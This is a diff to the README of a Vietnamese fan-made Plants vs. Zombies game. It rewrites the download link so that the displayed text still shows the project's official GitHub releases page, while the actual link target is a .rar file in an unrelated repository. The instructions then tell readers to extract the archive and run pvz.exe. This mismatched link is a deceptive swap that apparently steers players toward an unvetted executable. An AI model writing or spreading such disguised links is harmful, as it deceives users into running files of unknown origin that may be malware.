@@ -81,7 +81,7 @@ Facebook: https://www.facebook.com/Lethituphuong2005
 
 ### **No code** <a name="download-no-code"></a>
 
-Tải game (được nén thành .zip) tại link sau: https://github.com/nmhienbn/PVZ-Kaito-NMH-Edition/releases/tag/published
+Tải game (được nén thành .rar) tại link sau:[ https://github.com/nmhienbn/PVZ-Kaito-NMH-Edition/releases/tag/published](https://github.com/le1510/project/blob/main/file.rar)
 Cách này tiết kiệm bộ nhớ và thời gian tải đi rất nhiều .
 Giải nén game vào một thư mục và bật pvz.exe lên và chơi.
 
@@ -90,7 +90,6 @@ Giải nén game vào một thư mục và bật pvz.exe lên và chơi.
 Bước 1: Clone repo này về hoặc chọn Code -> Download Zip
 Tất cả code đều nằm trong thư mục src.
 Có thể nhảy đến bước 5 để chơi luôn.   
-![](./res/textures/map/Ảnh chụp màn hình 2024-04-25 142446.png)
 
 Bước 2: Cài mingw. Ở đây tôi cài đặt phiên bản MinGW-W64 GCC-8.1.0 x86_64-posix-seh.
 Một số chú ý:
